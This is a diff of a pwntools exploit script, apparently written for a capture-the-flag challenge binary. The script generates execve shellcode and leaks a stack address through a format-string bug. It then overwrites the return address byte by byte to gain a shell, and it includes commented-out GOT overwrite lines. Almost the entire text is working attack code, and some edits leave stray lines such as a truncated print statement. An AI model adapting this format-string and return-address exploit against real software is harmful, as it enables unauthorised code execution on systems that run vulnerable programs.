@@ -2,12 +2,9 @@
 from locale import format_string
 from pwn import *
 
-exe = ELF("./5", checksec=False)
+exe = ELF("/var/challenge/level5/5", checksec=False)
 context.binary = exe
 
-# target: overwrite memory at 0x601050 with 0xdeadbeef
-writes = {0x601050: 0xdeadbeef}
-offset = 7  # if you know it, else let FmtStr find it
 context.binary = exe
 shellcode = shellcraft.execve("/usr/local/bin/l33t", ["/usr/local/bin/l33t"], 0)
 print(shellcode)
@@ -36,7 +33,7 @@ def main():
     global r
     with open("shellcode_full", "wb") as f:
         f.write(b"\xbb"*40 + shellcode + b"\xbb"*40)
-    print('export SHELLCODE="$(cat shellcode_full)"')
+    print('     "')
     print(shellcode)
     r = conn()
 
@@ -62,6 +59,10 @@ def main():
     log.success("Format string offset is: %d", format_string.offset)
     format_string.offset = format_string.offset
 
+
+    #format_string.write(got_addr_printf, 0x1337babe)  # 0xe1
+    #format_string.execute_writes()
+
     offset_stack = 0x7fffffffdd60 - 0x7fffffffdc48
     r.sendline(b"%18$p")
     r.recvuntil(b"password is: ")
@@ -73,7 +74,7 @@ def main():
     log.success("Leaked ret_ptr: " + hex(stack_addr))
     r.recv()
     r.sendline(b"n")
-    ret_addr = 0x7fffffffe121
+    ret_addr = 0x7fffffffe5e9
 
     for i in range(6):
         num = ret_addr >> (8 * i) & 0xff
@@ -93,6 +94,8 @@ def main():
 
     r.interactive()
     sleep(3)
+
+    # Send it
 
 
 if __name__ == "__main__":
